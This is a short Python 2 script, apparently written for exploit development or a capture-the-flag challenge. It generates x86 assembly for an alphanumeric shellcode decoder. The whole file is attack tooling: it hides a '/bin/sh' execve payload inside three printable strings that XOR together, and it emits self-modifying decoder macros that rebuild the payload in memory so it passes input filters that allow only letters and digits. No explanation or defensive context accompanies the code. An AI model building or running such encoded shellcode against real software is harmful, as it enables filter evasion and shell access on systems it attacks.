length = 0xeb
def decompose(l):
	digits = "".join(str(i) for i in range(10))
	lower = "".join(chr(n) for n in range(ord('a'), ord('z') +1))
	upper = "".join(chr(n) for n in range(ord('A'), ord('Z') +1))
	valid = digits + lower + upper
	hundreds = l // 0x100
	nops = 0
	last_byte = l % 0x100
	while(True):
		for offset_c in valid:
			for edi_c in valid:
				if (last_byte + nops == ord(offset_c) + 2 * ord(edi_c)):
					return ord(offset_c), hundreds, ord(edi_c), nops
				if (last_byte + nops == 0x100 + ord(offset_c) + 2 * ord(edi_c)):
					return ord(offset_c), hundreds + 1, ord(edi_c), nops
		nops += 2

def to_hex(s):
	return "0x" + s[::-1].encode("hex")

#scs = ["11111a11d1111a1a41111111111", "1b1W1uaGz2F1aSNv8111d111d11", "jXX0R0X00X0SW0000000zbinzsh"][::-1]
scs = ['11111a11d1111a1a411111111115', '1b1W1uaGz2F1aSNv8111d111d11Z', 'jXX0R0X00X0SW0000000zbinzsh0'][::-1]
op = []
n = len(scs[0])
offset, hundreds, edi, nops = decompose(length)

op.append(".set OFFSET, " + hex(offset))
op.append(".set EDI, " + hex(edi))

op.append(".macro fix_ecx")
for i in range(nops):
	op.append("decl %ecx")
if hundreds:
	op.append("pushl %ecx")
	op.append("incl %esp")
	op.append("popl %ecx")
	for i in range(hundreds):
		op.append("incl %ecx")
	op.append("pushl %ecx")
	op.append("decl %esp")
	op.append("popl %ecx")
op.append(".endm")

op.append(".macro decoder")
for i in range(n / 4):
	longs = [scs[k][4*i:4*(i+1)] for k in range(3)]
	specials = []
	for j in range(4):
		if longs[0][j] == '0': specials.append(j)
	if specials != []:
		op.append("pmovl %ebp, %eax")
		op.append("pushl %edx")
		for j in specials:
			op.append("xorb %al, 0x3" + str(j+6) + "(%esp, %esi, 1)")
		op.append("popl %eax")
		op.append("xorl $" + to_hex(longs[0]) + ", %eax")
	else:
		op.append("pmovl $" + to_hex(longs[0]) + ", %eax")
	op.append("xorl $" + to_hex(longs[1]) + ", %eax")
	op.append("xorl %eax, OFFSET(%ecx, %edi, 2)")
	op.append("incl %edi")
	op.append("incl %edi")
	op.append("")
op.append(".endm")

print "\t" + "\n\t".join(op)
